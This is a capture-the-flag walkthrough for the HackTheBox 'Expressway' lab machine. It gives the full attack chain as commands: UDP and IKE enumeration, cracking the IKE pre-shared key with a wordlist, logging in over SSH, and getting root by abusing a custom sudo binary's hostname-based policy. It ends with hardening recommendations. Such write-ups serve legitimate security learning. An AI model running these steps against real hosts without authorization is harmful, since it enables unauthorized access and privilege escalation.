Expressway HTB Writeup

HackTheBox Machine Walkthrough

Machine Information

Name: Expressway
IP: 10.10.11.87
Difficulty: Medium
OS: Linux

Reconnaissance

Initial Scan

nmap -sC -sV 10.10.11.87
Results: Only SSH port 22 open
22/tcp open ssh OpenSSH 10.0p2 Debian 8

Comprehensive Scanning

nmap -p- --min-rate 10000 10.10.11.87
Results: Still only port 22 visible

UDP Service Discovery

./udpx -t 10.10.11.87 -c 128 -w 1000
Critical Finding: UDP port 500 (IKE service) discovered

IKE Service Enumeration

Aggressive Mode Handshake

ike-scan -M -A 10.10.11.87
Key Findings:
  • IKE service running on UDP 500
  • Aggressive Mode enabled
  • Domain: expressway.htb
  • Username: ike
  • Authentication: PSK (Pre-Shared Key)
  • Encryption: 3DES with SHA1

PSK Extraction

ike-scan -A --pskcrack 10.10.11.87 > ike_psk.txt

PSK Cracking

Dictionary Attack

psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk.txt
Success: Found PSK freakingrockstarontheroad

Initial Access

SSH Connection

ssh ike@10.10.11.87
Password: freakingrockstarontheroad

User Flag

cat /home/ike/user.txt

Privilege Escalation

Enumeration

id
Found: Member of proxy group
find / -group proxy -type f 2>/dev/null cat /var/log/squid/access.log.1
Key Evidence: Found attempt to access http://offramp.expressway.htb through proxy
Custom Sudo Binary: Discovered custom sudo at /usr/local/bin/sudo with hostname-based policies

Exploitation

/usr/local/bin/sudo -h offramp.expressway.htb cat /root/root.txt
/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash

Root Flag

cat /root/root.txt

Key Attack Vectors

  1. UDP Service Discovery: IKE service on UDP 500 was initially missed in TCP scans
  2. Weak PSK: Pre-shared key vulnerable to dictionary attack
  3. Hostname-Based Sudo Policy: Custom sudo binary trusted commands from internal host offramp.expressway.htb
  4. Proxy Group Access: Read access to proxy logs revealed internal hostname

Security Recommendations

IKE Configuration

  • Disable Aggressive Mode
  • Use strong, unique PSK
  • Implement certificate-based authentication

Sudo Security

  • Avoid hostname-based trust policies
  • Implement principle of least privilege
  • Regular security audits of sudo configurations

Access Control

  • Restrict proxy log access
  • Implement proper network segmentation
  • Regular credential rotation
